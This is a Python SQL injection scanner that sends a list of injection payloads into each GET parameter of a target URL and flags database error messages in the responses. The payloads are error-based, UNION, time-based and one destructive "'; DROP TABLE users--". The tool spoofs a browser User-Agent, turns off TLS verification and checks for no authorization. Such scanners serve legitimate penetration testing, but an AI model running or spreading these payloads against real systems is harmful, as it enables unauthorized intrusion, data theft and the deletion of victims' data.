
import requests
import re
import time
from urllib.parse import urljoin, urlparse
from colorama import Fore, Style

class SQLInjectionScanner:
    def __init__(self):
        self.session = requests.Session()
        self.session.verify = False
        self.session.timeout = 15
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        })
        self.payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "' OR 'a'='a",
            "') OR ('1'='1",
            "' UNION SELECT NULL--",
            "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
            "' AND 1=CONVERT(int, (SELECT @@version))--",
            "' WAITFOR DELAY '00:00:05'--",
            "'; DROP TABLE users--",
            "' OR SLEEP(5)--",
            "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            "' UNION SELECT 1,2,3,4,5,6,7,8,9,10--",
            "' OR 1=1 LIMIT 1--",
            "' OR 'x'='x",
            "') OR ('x'='x",
            "' AND 1=2 UNION SELECT 1,2,3--",
            "' OR 1=1#",
            "' OR 'a'='a'#",
            "' UNION ALL SELECT NULL,NULL,NULL--",
            "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--"
        ]
        
        self.error_patterns = [
            r"SQL syntax.*MySQL",
            r"Warning.*mysql_.*",
            r"valid MySQL result",
            r"MySqlClient\.",
            r"PostgreSQL.*ERROR",
            r"Warning.*\Wpg_.*",
            r"valid PostgreSQL result",
            r"Npgsql\.",
            r"Driver.*SQL.*Server",
            r"OLE DB.*SQL Server",
            r"(\W|\A)SQL Server.*Driver",
            r"Warning.*mssql_.*",
            r"(\W|\A)SQL Server.*[0-9a-fA-F]{8}",
            r"Exception.*\WSystem\.Data\.SqlClient\.",
            r"Exception.*\WRoadhouse\.Cms\.",
            r"Microsoft Access Driver",
            r"JET Database Engine",
            r"Access Database Engine",
            r"ODBC Microsoft Access",
            r"Oracle error",
            r"Oracle.*Driver",
            r"Warning.*\Woci_.*",
            r"Warning.*\Wora_.*"
        ]
    
    def scan_url(self, url, params=None):
        vulnerabilities = []
        
        print(f"{Fore.YELLOW}Scanning {url} for SQL Injection...{Style.RESET_ALL}")
        
        for payload in self.payloads:
            try:
                if params:
                    for param in params:
                        test_params = params.copy()
                        test_params[param] = payload
                        
                        response = self.session.get(url, params=test_params)
                        
                        for pattern in self.error_patterns:
                            if re.search(pattern, response.text, re.IGNORECASE):
                                vuln = {
                                    'type': 'SQL Injection',
                                    'url': url,
                                    'parameter': param,
                                    'payload': payload,
                                    'method': 'GET',
                                    'evidence': pattern
                                }
                                vulnerabilities.append(vuln)
                                print(f"{Fore.RED}SQL Injection found: {param} = {payload}{Style.RESET_ALL}")
                                break
                
                time.sleep(0.5)
                
            except Exception as e:
                print(f"{Fore.RED}Error testing {url}: {str(e)}{Style.RESET_ALL}")
                continue
        
        return vulnerabilities
